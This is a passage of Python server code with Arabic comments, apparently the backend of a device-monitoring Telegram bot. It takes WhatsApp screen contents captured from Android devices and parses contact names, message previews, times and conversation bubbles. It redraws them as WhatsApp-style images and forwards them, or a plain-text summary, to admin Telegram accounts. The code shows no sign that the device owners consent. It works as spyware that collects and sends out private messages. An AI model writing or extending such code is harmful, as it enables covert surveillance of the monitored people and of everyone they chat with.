        idx = sum(ord(c) for c in name) % len(AVATAR_COLORS)
        return AVATAR_COLORS[idx]

    def get_initial(name):
        return name[0] if name else "?"

    rows = []
    for chat in chats:
        name = chat.get("name", "")
        last_msg = chat.get("lastMessage", "")
        time_str = chat.get("time", "")
        unread = chat.get("unread", 0)
        sent = chat.get("sent", False)

        color = get_color(name)
        initial = get_initial(name)

        check_svg = ""
        if sent:
            check_svg = '<svg class="double-check" viewBox="0 0 16 11"><path d="M11.071.653a.5.5 0 0 1 .124.698l-4.5 6.5a.5.5 0 0 1-.731.131L3.5 5.773a.5.5 0 1 1 .625-.78L5.81 6.234l4.56-6.584a.5.5 0 0 1 .701-.097zm4.5 0a.5.5 0 0 1 .124.698l-4.5 6.5a.5.5 0 0 1-.731.131l-.5-.4a.5.5 0 1 1 .625-.78l.146.117 4.56-6.584a.5.5 0 0 1 .701-.097z"/></svg>'

        unread_badge = ""
        if unread > 0:
            unread_badge = f'<div class="unread-badge">{unread}</div>'
            time_class = "chat-time unread"
        else:
            time_class = "chat-time"

        row = f'''<div class="chat-row">
            <div class="avatar" style="background:{color}">{initial}</div>
            <div class="chat-content">
                <div class="chat-top">
                    <div class="chat-name">{name}</div>
                    <div class="{time_class}">{time_str}</div>
                </div>
                <div class="chat-bottom">
                    <div class="chat-preview">{check_svg}<span>{last_msg}</span></div>
                    {unread_badge}
                </div>
            </div>
        </div>'''
        rows.append(row)

    return "\n".join(rows)


def _get_fallback_template():
    """قالب HTML بسيط كاحتياطي."""
    return '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><style>
body { font-family: sans-serif; background: #0b141a; color: #e9edef; width: 390px; padding: 16px; }
.chat { padding: 12px; border-bottom: 1px solid #333; }
.name { font-weight: bold; }
.time { color: #8696a0; font-size: 12px; float: left; }
.msg { color: #8696a0; }
</style></head><body>
<!-- chats will be inserted here by Python -->
</body></html>'''


def _send_fallback_message(dev, data, error_msg):
    """أرسل رسالة نصية عند فشل القالب."""
    if mdm_bot:
        short_label = _dev_label(dev)
        chats = data.get("chats", [])
        text_lines = []
        for c in chats[:10]:
            name = c.get("name", "?")
            msg = c.get("lastMessage", "")
            t = c.get("time", "")
            u = c.get("unread", 0)
            badge = f" [{u}]" if u > 0 else ""
            text_lines.append(f"👤 {name} ({t}){badge}\n   {msg}")
        text = "\n\n".join(text_lines)[:3500]

        for admin_id in Config.ADMIN_IDS:
            try:
                mdm_bot.bot.send_message(
                    admin_id,
                    f"⚠️ <b>قالب HTML فشل</b>\nالخطأ: {error_msg}\n\n📱 <b>{short_label}</b>\n\n{text}",
                    parse_mode="HTML"
                )
            except Exception:
                pass


def _handle_screen_json_legacy(dev, data):
    """Legacy Pillow-based rendering (fallback)."""
    try:
        from PIL import Image, ImageDraw, ImageFont, ImageFilter
        import io as _io
        import re as _re
        import time as _time
    except ImportError as e:
        logger.error(f"❌ Pillow not installed: {e}")
        if mdm_bot:
            short_label = _dev_label(dev)
            json_str = str(data)[:3000]
            for admin_id in Config.ADMIN_IDS:
                try:
                    mdm_bot.bot.send_message(admin_id,
                        f"📋 <b>لقطة شاشة (JSON — Pillow غير مثبت)</b>\n\n"
                        f"📱 <b>{short_label}</b>\n📦 {data.get('view_count', 0)} عناصر\n\n"
                        f"<code>{json_str}</code>",
                        parse_mode="HTML")
                except Exception:
                    pass
        return

    screen_w = data.get("screen_width", 1080)
    screen_h = data.get("screen_height", 1920)
    package = data.get("package", "unknown")
    views = data.get("views", [])
    source = data.get("source", "manual")
    class_name = data.get("class_name", "")  # ⚡ أسطوري: اسم الواجهة من Android

    # ────────────────────────────────────────────────────────────
    # ⚡ أسطوري: قاموس واجهات واتساب — يعرف كل واجهة من class name
    # ────────────────────────────────────────────────────────────
    WHATSAPP_LAYOUTS = {
        # القائمة الرئيسية
        "HomeActivity": "chat_list",
        "com.whatsapp.HomeActivity": "chat_list",
        "Main": "chat_list",
        # محادثة مفتوحة
        "ConversationActivity": "conversation",
        "com.whatsapp.ConversationActivity": "conversation",
        "Conversation": "conversation",
        # الإعدادات
        "SettingsActivity": "settings",
        "com.whatsapp.settings.Settings": "settings",
        # معلومات جهة اتصال
        "ContactInfoActivity": "contact_info",
        "ViewProfileActivity": "contact_info",
        # الحالات
        "StatusActivity": "status",
        # المكالمات
        "CallsActivity": "calls",
    }

    # ────────────────────────────────────────────────────────────
    # Layer 1: Load Arabic-capable fonts (Noto Sans Arabic + fallback)
    # ────────────────────────────────────────────────────────────
    import os as _os
    _font_dir = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "fonts")

    def _load_font(size, bold=False):
        # Priority 1: Noto Sans Arabic (best Arabic support)
        noto_arabic = _os.path.join(_font_dir, "NotoSansArabic-Bold.ttf" if bold else "NotoSansArabic-Regular.ttf")
        # Priority 2: DejaVu Sans (Latin + some Arabic)
        dejavu = f"/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
        # Priority 3: Liberation
        liberation = f"/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf"

        candidates = [noto_arabic, dejavu, liberation]
        for path in candidates:
            try:
                return ImageFont.truetype(path, size)
            except Exception:
                continue
        return ImageFont.load_default()

    font_title = _load_font(18, bold=True)
    font_header = _load_font(16, bold=True)
    font_msg = _load_font(14)
    font_name = _load_font(13, bold=True)
    font_time = _load_font(11)
    font_small = _load_font(10)

    # ────────────────────────────────────────────────────────────
    # Layer 12: Emoji mapping table (replace unsupported emojis)
    # ────────────────────────────────────────────────────────────
    emoji_map = {
        "📷": "[CAM]", "🔍": "[SRH]", "📞": "[CAL]", "⋮": "[MNU]",
        "💬": "[MSG]", "👥": "[GRP]", "✓✓": ">>", "✓": ">",
        "☎": "[PHN]", "←": "<-", "→": "->", "‹": "<",
        "😀": ":)", "😂": ":D", "❤": "<3", "👍": "(Y)",
        "🔥": "[*]", "🎉": "[!]", "🙏": "[pray]",
    }

    def _clean_emoji(text):
        """Layer 12: Replace unsupported emojis with text equivalents."""
        if not text:
            return text
        for emoji, replacement in emoji_map.items():
            text = text.replace(emoji, replacement)
        return text

    # ────────────────────────────────────────────────────────────
    # Layer 2: Filter out buttons, tabs, and non-message elements
    # ⚡ أسطوري: قائمة موسّعة للنصوص الداخلية التي يجب تجاهلها
    # ────────────────────────────────────────────────────────────
    ignore_texts = {
        # تبويبات واتساب
        "Chats", "Status", "Calls", "Settings", "Groups", "Updates",
        "مكالمات", "الحالات", "الإعدادات", "المحادثات", "المجموعات", "التحديثات",
        # شريط الإدخال
        "Send", "ارسال", "Type a message", "اكتب رسالة",
        "Message", "رسالة", "رسائل",
        # شريط البحث
        "Search", "بحث", "ابحث",
        "ابحث عن رسالة أو جهة اتصال",
        "ابحث أو ابدأ محادثة جديدة",
        "ابحث في Meta AI",
        # الأزرار
        "Camera", "كاميرا",
        "New group", "مجموعة جديدة",
        "New broadcast", "بث جديد",
        "WhatsApp Web", "واتساب ويب",
        "Starred messages", "الرسائل المميزة",
        "Menu", "القائمة",
        "More options", "المزيد من الخيارات",
        "More", "المزيد",
        # نصوص واتساب الداخلية (إشعارات النظام)
        "محادثة", "هل تريد إضافة",
        "الرسائل والمجموعات التي تمت مشاركتها",
        "تمت مشاركة الرسائل والمجموعات معك",
        "الرسائل التي يتم إرسالها إلى هذا المحادثة",
        "سيتم حذفها من جهازك",
        "المحادثات المقفلة مؤقتاً",
        "Tap to unlock", "اضغط للفتح",
        "Type a message", "اكتب رسالة",
        "Online", "متصل الآن", "online",
        "typing...", "يكتب...",
        # نصوص Meta AI
        "Meta AI", "Ask Meta AI", "اسأل Meta AI",
        # ⚡ فلاتر داخلية إضافية (أزرار التصفية في القائمة)
        "الكل", "All", "غير مقروء", "Unread",
        "المفضلة", "Favorites", "Favorite",
        "الإشعارات", "Notifications",
        "غير مقروءة", "Unread",
        # ⚡ فلاتر إجراءات + حالات
        "تم التسليم", "Delivered", "تم القراءة", "Read",
        "مؤخراً", "Recently",
        "السابق", "Previous", "التالي", "Next",
        "تحديد", "Select", "تحديد الكل", "Select all",
        "حذف", "Delete", "أرشفة", "Archive",
        "تم", "Done", "إلغاء", "Cancel",
        "موافق", "OK", "تأكيد", "Confirm",
        "تحرير", "Edit", "تعديل",
        "مشاركة", "Share", "نسخ", "Copy",
        "إعادة توجيه", "Forward",
        "رد", "Reply", "الرد",
        "صامت", "Mute", "إلغاء كتم الصوت", "Unmute",
        "حظر", "Block", "إلغاء الحظر", "Unblock",
        "تقرير", "Report", "إبلاغ",
        # نصوص حالة الرسالة
        "✓", "✓✓", "Sending...", "جاري الإرسال...",
        # نصوص المكالمات
        "مكالمة فيديو", "Video call", "مكالمة صوتية", "Voice call",
        "مكالمة فائتة", "Missed call",
        # نصوص إضافية
        "انتظر", "Wait", "جاري التحميل", "Loading",
        "لا توجد محادثات", "No chats",
        "ابدأ محادثة", "Start chat",
        # نصوص الإعدادات السريعة
        "حالة الاتصال", "Connection status",
        "تشفير من طرف لطرف", "End-to-end encrypted",
        # نصوص القائمة المنسدلة
        "خيارات", "Options",
        "عرض المعلومات", "View info",
        "تفاصيل", "Details",
        # ⚡ ملاحظة: "اليوم" و "أمس" و "الآن" تم إزالتها من هنا
        # لأنها تُعامل كأوقات في is_time_text() وتظهر في موقع الوقت الصحيح
    }

    # ⚡ أسطوري: قالب مرجعي ثابت لقائمة المحادثات (مطابق للصورة المرجعية)
    CHAT_LIST_TEMPLATE = {
        "header": {
            "title": "WhatsApp",  # أو "واتساب"
            "color": (7, 94, 84),  # #075E54 أخضر واتساب الغامق
            "icons_left": "📷",     # أيقونة الكاميرا
            "icons_right": ["🔍", "⋮"]  # بحث + قائمة
        },
        "search": {
            "placeholder": "ابحث أو ابدأ محادثة جديدة",
            "color": (242, 242, 242),  # رمادي فاتح
            "icon": "🔍"
        },
        "row_height": 60,
        "avatar_size": 40,
        "bottom_tabs": [
            ("💬", "المحادثات", True),    # نشط
            ("👥", "المجموعات", False),
            ("📷", "الحالات", False),
            ("📞", "المكالمات", False),
        ]
    }

    # ⚡ أسطوري: قالب مرجعي لمحادثة مفتوحة
    CONVERSATION_TEMPLATE = {
        "header_color": (7, 94, 84),
        "bg_color": (236, 229, 221),  # #ECE5DD
        "bubble_out_color": (210, 248, 192),  # #DCF8C6
        "bubble_in_color": (255, 255, 255),
        "input_placeholder": "اكتب رسالة",
    }

    # Roles to skip in rendering
    skip_roles = {"search", "input", "send_button", "root"}

    # ────────────────────────────────────────────────────────────
    # Parse views — extract role + text + position
    # ────────────────────────────────────────────────────────────
    parsed = []
    has_message_role = False
    has_chat_row_role = False
    has_date_separator = False

    for v in views:
        x = v.get("x", 0)
        y = v.get("y", 0)
        w = v.get("w", 0)
        h = v.get("h", 0)
        right = v.get("right", x + w)

        text = v.get("text", "") or v.get("desc", "")
        if not text:
            continue

        role = v.get("role", "")
        msg_type = v.get("msg_type", "")
        sender = v.get("sender", "")

        # Layer 2: Skip unwanted roles
        if role in skip_roles:
            continue

        # Layer 2: Skip unwanted texts (buttons, tabs) — exact match
        if text.strip() in ignore_texts:
            continue

        # ⚡ أسطوري: Skip texts that CONTAIN internal WhatsApp phrases
        skip_contains = [
            "هل تريد إضافة",
            "تمت مشاركة الرسائل",
            "الرسائل والمجموعات التي",
            "الرسائل التي يتم إرسالها",
            "سيتم حذفها من جهازك",
            "المحادثات المقفلة",
            "ابحث في Meta",
            "Ask Meta AI",
            # ⚡ أسطوري: فلاتر جزئية جديدة
            "تم التسليم", "تم القراءة",
            "جاري الإرسال", "Sending",
            "مكالمة فائتة", "Missed call",
            "تشفير من طرف لطرف", "End-to-end",
            "اضغط للفتح", "Tap to unlock",
            "اضغط للمتابعة", "Tap to continue",
            "اكتب رسالة", "Type a message",
            "أعجبني", "Liked", "تفاعل",
            "تمت الإضافة", "Added you",
            "متصل الآن", "online",
            "يكتب", "typing",
            "جاري التسجيل", "Recording",
            "صوتي", "Voice message",
            "صورة", "Photo",
            "فيديو", "Video",
            "مستند", "Document",
            "ملصق", "Sticker",
            "GIF",
            "تم التحميل", "Downloaded",
            "بانتظار التحميل", "Waiting to download",
            "بانتظار الإرسال", "Waiting to send",
            "فشل الإرسال", "Failed to send",
            "أعد الإرسال", "Try again",
            "محذوفة", "Deleted",
            "غير متاح", "Not available",
        ]
        should_skip = False
        for phrase in skip_contains:
            if phrase in text:
                should_skip = True
                break
        if should_skip:
            continue

        # ⚡ أسطوري: Skip pure "محادثة" text if it's standalone (إشعار داخلي)
        if text.strip() == "محادثة":
            continue

        # Layer 2: Skip very short texts that are likely icons
        if len(text.strip()) < 2 and role not in ("time", "date_separator"):
            continue

        # ⚡ أسطوري: Skip phone numbers (8+ digits) — likely UI elements
        digits_only = "".join(c for c in text if c.isdigit())
        if len(digits_only) >= 8 and len(text.replace(" ", "")) <= 12:
            continue

        if role == "message":
            has_message_role = True
        elif role == "chat_row":
            has_chat_row_role = True
        elif role == "date_separator":
            has_date_separator = True

        # Layer 12: Clean emoji
        clean_text = _clean_emoji(text)

        # Layer 3: Smart direction detection
        # A message is outgoing if its RIGHT edge is near the screen right edge
        # (not just X > screen_w/2, which fails for short messages)
        is_outgoing = False
        if role == "message":
            # Outgoing messages have their right edge near screen width
            right_edge_ratio = right / max(screen_w, 1)
            left_edge_ratio = x / max(screen_w, 1)
            # If right edge is > 80% of screen width → outgoing
            # If left edge is < 20% → incoming
            if right_edge_ratio > 0.75:
                is_outgoing = True
            elif left_edge_ratio < 0.25:
                is_outgoing = False
            else:
                # Fallback: center-based
                is_outgoing = (x + w / 2) > (screen_w / 2)

        parsed.append({
            "text": clean_text,
            "raw_text": text,
            "x": x, "y": y, "w": w, "h": h,
            "right": right,
            "out": is_outgoing,
            "role": role,
            "msg_type": msg_type,
            "sender": sender,
            "id": v.get("id", ""),
            "idx": v.get("idx", 0)
        })

    # Sort by Y (top to bottom)
    parsed.sort(key=lambda v: v["y"])

    # ────────────────────────────────────────────────────────────
    # Layer 5: Pair messages with adjacent time stamps
    # ────────────────────────────────────────────────────────────
    # For each message, find the nearest time element within 30px vertically
    for msg in parsed:
        if msg["role"] != "message":
            continue
        # Find nearest time element
        best_time = None
        best_dist = 1000
        for t in parsed:
            if t["role"] != "time":
                continue
            dist = abs(t["y"] - msg["y"])
            if dist < best_dist and dist < 50:
                # Time should be on the same side as the message
                if msg["out"] and t["x"] > screen_w / 2:
                    best_dist = dist
                    best_time = t["text"]
                elif not msg["out"] and t["x"] < screen_w / 2:
                    best_dist = dist
                    best_time = t["text"]
        if best_time:
            msg["time"] = best_time

    # ────────────────────────────────────────────────────────────
    # Detect UI type — أسطوري: 3 طبقات كشف بدون تخمين عشوائي
    # ────────────────────────────────────────────────────────────
    is_whatsapp = source == "whatsapp_monitor" or "whatsapp" in package
    ui_type = "generic"

    # ⚡ الأولوية 1: من class_name (دقة 100%)
    if class_name:
        # استخرج الاسم الأخير من class (مثلاً com.whatsapp.HomeActivity → HomeActivity)
        short_class = class_name.split(".")[-1] if "." in class_name else class_name
        if short_class in WHATSAPP_LAYOUTS:
            ui_type = WHATSAPP_LAYOUTS[short_class]
            logger.info(f"📸 UI type from class_name: {short_class} → {ui_type}")
        elif class_name in WHATSAPP_LAYOUTS:
            ui_type = WHATSAPP_LAYOUTS[class_name]
            logger.info(f"📸 UI type from class_name (full): {class_name} → {ui_type}")

    # ⚡ الأولوية 2: بصمات نصية (دقة 95%) — إذا class_name غير معروف
    if ui_type == "generic" and is_whatsapp:
        all_text = " ".join([v["text"] for v in parsed])
        all_text_lower = all_text.lower()

        # بصمات المحادثة المفتوحة (الأكثر تميزاً)
        conversation_fingerprints = [
            "اكتب رسالة", "Type a message", "type a message",
            "message_text", "Message", "Send", "ارسال",
            "اكتب هنا", "Text", "text_composer"
        ]
        # بصمات الإعدادات
        settings_fingerprints = [
            "الإعدادات", "Settings", "settings",
            "الحساب", "Account", "الخصوصية", "Privacy",
            "المحادثات", "Chats", "الإشعارات", "Notifications"
        ]
        # بصمات معلومات جهة الاتصال
        contact_info_fingerprints = [
            "معلومات الاتصال", "Contact info", "معاينة",
            "مكالمة فيديو", "Video call", "صامت", "Mute"
        ]
        # بصمات الحالات
        status_fingerprints = [
            "الحالة", "Status", "My status", "حالتي",
            "التحديثات", "Recent updates"
        ]
        # بصمات المكالمات
        calls_fingerprints = [
            "المكالمات", "Calls", "مكالمات صادرة", "مكالمات واردة"
        ]
        # بصمات قائمة المحادثات
        chat_list_fingerprints = [
            "ابحث في Meta AI", "Meta AI", "ابحث أو ابدأ محادثة",
            "ابحث عن رسالة", "Search", "ابحث",
            "Chats", "المحادثات", "المجموعات"
        ]

        # تحقق بالترتيب (الأكثر تميزاً أولاً)
        if any(fp in all_text for fp in conversation_fingerprints):
            ui_type = "conversation"
            logger.info(f"📸 UI type from text fingerprint: conversation (اكتب رسالة)")
        elif any(fp in all_text for fp in settings_fingerprints):
            # تأكد أنه ليس قائمة المحادثات (التي تحتوي "المحادثات" كتبويب)
            if "الإعدادات" in all_text or "Settings" in all_text:
                ui_type = "settings"
                logger.info(f"📸 UI type from text fingerprint: settings")
        elif any(fp in all_text for fp in contact_info_fingerprints):
            ui_type = "contact_info"
            logger.info(f"📸 UI type from text fingerprint: contact_info")
        elif any(fp in all_text for fp in status_fingerprints):
            ui_type = "status"
            logger.info(f"📸 UI type from text fingerprint: status")
        elif any(fp in all_text for fp in calls_fingerprints):
            ui_type = "calls"
            logger.info(f"📸 UI type from text fingerprint: calls")
        elif any(fp in all_text for fp in chat_list_fingerprints):
            ui_type = "chat_list"
            logger.info(f"📸 UI type from text fingerprint: chat_list")

    # ⚡ الأولوية 3: بنية البيانات (دقة 85%) — آخر احتياطي
    if ui_type == "generic" and is_whatsapp:
        if has_message_role:
            ui_type = "conversation"
            logger.info(f"📸 UI type from data structure: conversation (has messages)")
        elif has_chat_row_role:
            ui_type = "chat_list"
            logger.info(f"📸 UI type from data structure: chat_list (has chat rows)")
        # ❌ لا تخمين عشوائي — اترك generic إذا لم نعرف

    logger.info(f"📸 screen_json FINAL: ui_type={ui_type}, class={class_name}, views={len(parsed)}, "
                f"has_msg={has_message_role}, has_row={has_chat_row_role}")

    # ────────────────────────────────────────────────────────────
    # Build image
    # ────────────────────────────────────────────────────────────
    scale = 720.0 / max(screen_w, 1)
    img_w = int(screen_w * scale)
    img_h = int(screen_h * scale)

    # WhatsApp official colors — قيم افتراضية أولاً لمنع الأخطاء
    bg_color = (245, 245, 245)
    header_bg = (33, 150, 243)
    title_color = (255, 255, 255)
    name_color = (17, 17, 17)
    msg_preview_color = (102, 102, 102)
    time_color = (136, 136, 136)
    app_name = package
    search_bg = (242, 242, 242)
    divider_color = (230, 230, 230)
    badge_color = (37, 211, 102)
    avatar_bg = (37, 211, 102)
    bubble_out_color = (210, 248, 192)
    bubble_in_color = (255, 255, 255)
    bubble_out_text = (17, 17, 17)
    bubble_in_text = (17, 17, 17)
    sender_name_color = (37, 211, 102)

    if is_whatsapp:
        app_name = "WhatsApp"
        if ui_type == "chat_list":
            bg_color = (255, 255, 255)
            header_bg = (7, 94, 84)
            search_bg = (242, 242, 242)
            divider_color = (230, 230, 230)
            title_color = (255, 255, 255)
            name_color = (17, 17, 17)
            msg_preview_color = (136, 136, 136)
            time_color = (136, 136, 136)
            badge_color = (37, 211, 102)
            avatar_bg = (37, 211, 102)
        else:
            # conversation, settings, contact_info, etc.
            bg_color = (236, 229, 221)   # #ECE5DD
            header_bg = (7, 94, 84)      # #075E54
            bubble_out_color = (210, 248, 192)  # #DCF8C6
            bubble_in_color = (255, 255, 255)
            bubble_out_text = (17, 17, 17)
            bubble_in_text = (17, 17, 17)
            time_color = (136, 136, 136)
            sender_name_color = (37, 211, 102)
            title_color = (255, 255, 255)
            name_color = (17, 17, 17)
            msg_preview_color = (136, 136, 136)

    # Layer 9: Create image with doodle background for conversations
    img = Image.new("RGB", (img_w, img_h), bg_color)
    draw = ImageDraw.Draw(img)

    # Layer 9: Draw doodle background pattern for WhatsApp conversation
    if is_whatsapp and ui_type == "conversation":
        _draw_doodle_bg(draw, img_w, img_h, bg_color)

    # ────────────────────────────────────────────────────────────
    # Render based on UI type
    # ────────────────────────────────────────────────────────────
    if ui_type == "chat_list":
        _render_chat_list(draw, img_w, img_h, parsed, scale, font_header,
                          font_name, font_msg, font_time, font_small,
                          bg_color, header_bg, search_bg, divider_color,
                          title_color, name_color, msg_preview_color,
                          time_color, badge_color, avatar_bg, app_name,
                          screen_w, _re)
    elif ui_type == "conversation":
        _render_conversation(draw, img, img_w, img_h, parsed, scale, font_header,
                             font_msg, font_name, font_time, font_small,
                             bg_color, header_bg, bubble_out_color,
                             bubble_in_color, bubble_out_text, bubble_in_text,
                             time_color, sender_name_color, title_color,
                             app_name, screen_w, _re)
    else:
        _render_generic(draw, img_w, img_h, parsed, scale, font_header,
                        font_msg, font_small, bg_color, header_bg,
                        title_color, name_color, app_name, package, _re)

    # ────────────────────────────────────────────────────────────
    # Build text box — ALL texts combined into one block
    # ────────────────────────────────────────────────────────────
    text_lines = []
    for v in parsed:
        prefix = ""
        if ui_type == "conversation":
            if v.get("role") == "message":
                prefix = ">> " if v["out"] else "<< "
            elif v.get("role") == "date_separator":
                prefix = "=== "
        elif v.get("role") == "chat_title":
            prefix = ">> "
        elif v.get("role") == "time":
            prefix = "[T] "
        text_lines.append(f"{prefix}{v['text'][:120]}")
    combined_text = "\n".join(text_lines)

    # Save image
    img_bio = _io.BytesIO()
    img.save(img_bio, format="PNG")
    img_bio.seek(0)

    # ────────────────────────────────────────────────────────────
    # Send to bot: image FIRST, then text box BELOW
    # ────────────────────────────────────────────────────────────
    if mdm_bot:
        short_label = _dev_label(dev)

        ui_label = {
            "chat_list": "قائمة المحادثات",
            "conversation": "محادثة مفتوحة",
            "generic": "واجهة عامة"
        }.get(ui_type, "واجهة")

        caption = (
            f"{'💬' if is_whatsapp else '📋'} <b>واجهة {'واتساب' if is_whatsapp else package}</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📱 <b>{short_label}</b>\n"
            f"🖼️ النوع: <b>{ui_label}</b>\n"
            f"📦 العناصر: {len(parsed)}\n"
            f"📏 الشاشة: {screen_w}x{screen_h}\n"
            f"🕐 {_time.strftime('%H:%M:%S')}"
        )

        for admin_id in Config.ADMIN_IDS:
            # Send ONLY the image (no text box) — user requested image only
            try:
                mdm_bot.bot.send_photo(
                    admin_id,
                    photo=img_bio,
                    caption=caption,
                    parse_mode="HTML"
                )
                img_bio.seek(0)
            except Exception as e:
                logger.error(f"فشل إرسال الصورة: {e}")

    _pending_cmds.pop(request.sid, None)


def _draw_doodle_bg(draw, img_w, img_h, bg_color):
    """Layer 9: Draw WhatsApp-style doodle background (subtle dots)."""
    try:
        # Subtle dots pattern (very light)
        dot_color = (
            min(bg_color[0] + 8, 255),
            min(bg_color[1] + 8, 255),
            min(bg_color[2] + 8, 255)
        )
        import random as _r
        _r.seed(42)  # deterministic pattern
        for _ in range(200):
            x = _r.randint(0, img_w)
            y = _r.randint(0, img_h)
            r = _r.choice([1, 1, 2])
            draw.ellipse([x, y, x + r, y + r], fill=dot_color)
    except Exception:
        pass


def _draw_shadow(draw, x1, y1, x2, y2, radius=10, blur=2):
    """Layer 10: Draw a soft shadow under a bubble."""
    try:
        # Draw a slightly darker rectangle offset below-right
        shadow_color = (0, 0, 0, 30)
        offset = 2
        # Use semi-transparent overlay (Pillow doesn't support alpha on RGB easily)
        # So we draw a slightly darker version of the bg
        for i in range(blur):
            alpha_rect = [x1 + offset + i, y1 + offset + i,
                          x2 + offset + i, y2 + offset + i]
            draw.rounded_rectangle(alpha_rect, radius=radius,
                                   fill=(180, 175, 170))
    except Exception:
        pass


def _render_chat_list(draw, img_w, img_h, parsed, scale, font_header,
                      font_name, font_msg, font_time, font_small,
                      bg_color, header_bg, search_bg, divider_color,
                      title_color, name_color, msg_preview_color,
                      time_color, badge_color, avatar_bg, app_name,
                      screen_w, _re):
    """Render WhatsApp chat list view."""
    # ⚡ أسطوري: قائمة ألوان متعددة للأيقونات (مثل واتساب الحقيقي)
    avatar_colors = [
        (37, 211, 102),    # أخضر واتساب
        (0, 150, 136),     # تيل
        (63, 81, 181),     # نيلي
        (244, 67, 54),     # أحمر
        (255, 152, 0),     # برتقالي
        (156, 39, 176),    # بنفسجي
        (121, 85, 72),     # بني
        (0, 188, 212),     # سماوي
        (76, 175, 80),     # أخضر فاتح
        (255, 87, 34),     # برتقالي داكن
        (3, 169, 244),     # أزرق فاتح
        (139, 195, 74),    # أخضر ليموني
    ]

    # ── Top header bar (green) ──
    header_h = 50
    draw.rectangle([0, 0, img_w, header_h], fill=header_bg)
    # Camera icon (left)
    draw.text((10, 14), "📷", fill=title_color, font=font_header)
    # App name (center-right) — أكبر وأوضح
    draw.text((50, 15), app_name, fill=title_color, font=font_header)
    # Search icon (right)
    draw.text((img_w - 70, 16), "🔍", fill=title_color, font=font_header)
    # Menu (right)
    draw.text((img_w - 40, 16), "⋮", fill=title_color, font=font_header)

    # ── Search bar (مُحسّن) ──
    search_y = header_h + 8
    search_h = 36
    search_pad = 10
    # شريط بحث بزوايا مستديرة أكثر ولون أوضح
    draw.rounded_rectangle(
        [search_pad, search_y, img_w - search_pad, search_y + search_h],
        radius=18, fill=search_bg
    )
    # أيقونة بحث داخل الشريط
    draw.text((search_pad + 14, search_y + 10), "🔍", fill=(130, 130, 130), font=font_msg)
    # نص البحث
    draw.text((search_pad + 38, search_y + 10), "ابحث أو ابدأ محادثة جديدة",
             fill=(130, 130, 130), font=font_msg)

    # ── Chat rows ──
    # Filter: skip header/search elements, take rows that look like chat entries
    row_y_start = search_y + search_h + 4
    row_h = 60

    # Take only items below the search bar
    chat_items = [v for v in parsed if v["y"] > (search_y / scale)]

    # ⚡ إصلاح أسطوري: إزالة النصوص المكررة قبل التجميع
    # Accessibility يُرجع نفس النص عدة مرات (parent + child لهما نفس النص)
    # نحتفظ فقط بأول ظهور لكل نص
    seen_texts = set()
    deduplicated_items = []
    for item in chat_items:
        text_key = item["text"].strip()
        if text_key and text_key not in seen_texts:
            seen_texts.add(text_key)
            deduplicated_items.append(item)
    chat_items = deduplicated_items

    # Group items by Y proximity (within 20px = same row)
    # ⚡ أسطوري: تقليل المسافة من 30 إلى 20 لمنع دمج صفين معاً
    rows = []
    current_row = []
    last_y = -1
    for v in chat_items:
        if last_y < 0 or abs(v["y"] - last_y) < 20:
            current_row.append(v)
        else:
            if current_row:
                rows.append(current_row)
            current_row = [v]
        last_y = v["y"]
    if current_row:
        rows.append(current_row)

    # ⚡ أسطوري: فلترة الصفوف التي تحتوي على عنصر واحد فقط بدون وقت
    # المحادثة الحقيقية فيها: اسم + معاينة (عنصرين على الأقل) أو اسم + وقت
    valid_rows = []
    for row in rows:
        if len(row) < 1:
            continue
        # إذا الصف فيه عنصر واحد فقط وتحته صف آخر قريب جداً → ادمجهما
        valid_rows.append(row)
    rows = valid_rows

    # ⚡ إصلاح: إزالة الصفوف الفارغة أو التي تحتوي على نص واحد فقط مكرر
    rows = [r for r in rows if r and len(r) >= 1]

    # ⚡ إصلاح: تخطي الصفوف التي تحتوي على نص واحد فقط (ليست محادثة حقيقية)
    # المحادثة الحقيقية فيها: اسم + معاينة (عنصرين على الأقل مختلفين)
    valid_rows = []
    for row in rows:
        unique_texts = set(item["text"].strip() for item in row)
        if len(unique_texts) >= 1:  # على الأقل نص واحد
            valid_rows.append(row)
    rows = valid_rows

    for row_idx, row in enumerate(rows[:15]):  # limit to 15 rows
        # ⚡ أسطوري: استخدم Y الحقيقية لأول عنصر في الصف
        if row:
            real_row_y = int(row[0]["y"] * scale)
            # تأكد أن الصف تحت شريط البحث
            if real_row_y < row_y_start:
                real_row_y = row_y_start
        else:
            continue

        current_y = real_row_y

        # ⚡ أسطوري: استخراج ذكي جداً للاسم والمعاينة والوقت
        # استراتيجية:
        # 1. الوقت = نص يحتوي على أرقام + ":" أو نص قصير جداً (مثل "12/17" أو "1:54" أو "أمس")
        # 2. الاسم = نص قصير (2-25 حرف) بدون أرقام كثيرة
        # 3. المعاينة = نص أطول (10+ حرف)

        name_text = ""
        preview_text = ""
        time_text = ""

        # دالة للتحقق إذا كان نص = وقت
        def is_time_text(t):
            if not t:
                return False
            t = t.strip()
            # أنماط الوقت: "1:54", "12:30", "أمس", "اليوم", "24 دقيقة", "2 ساعة"
            import re as _re_time
            if _re_time.match(r'^\d{1,2}:\d{2}', t):
                return True
            if _re_time.match(r'^\d{1,2}/\d{1,2}', t):
                return True
            if t in ("أمس", "اليوم", "الآن", "Yesterday", "Today", "Now"):
                return True
            if "دقيقة" in t or "ساعة" in t or "minute" in t or "hour" in t:
                return True
            if _re_time.match(r'^\d+\s*(ص|م|AM|PM)', t):
                return True
            return False

        # رتّب عناصر الصف حسب X (يسار لليمين)
        sorted_row = sorted(row, key=lambda x: x.get("x", 0))

        # استخراج الوقت أولاً (عادةً يمين الشاشة)
        for item in sorted_row:
            if is_time_text(item["text"]):
                time_text = item["text"]
                break

        # استخراج الاسم (عنصر role=chat_title أو sender، أو ID يحتوي name)
        for item in sorted_row:
            if item.get("role") in ("chat_title", "sender"):
                name_text = item["text"]
                break
        if not name_text:
            for item in sorted_row:
                item_id = item.get("id", "")
                if item_id and ("name" in item_id or "contact" in item_id):
                    name_text = item["text"]
                    break

        # استخراج المعاينة (نص أطول، ليس اسم ولا وقت)
        used_texts = {name_text, time_text}
        for item in sorted_row:
            t = item["text"]
            if t in used_texts:
                continue
            if is_time_text(t):
                continue
            # المعاينة عادةً أطول من الاسم
            if len(t) > 3:
                preview_text = t
                break

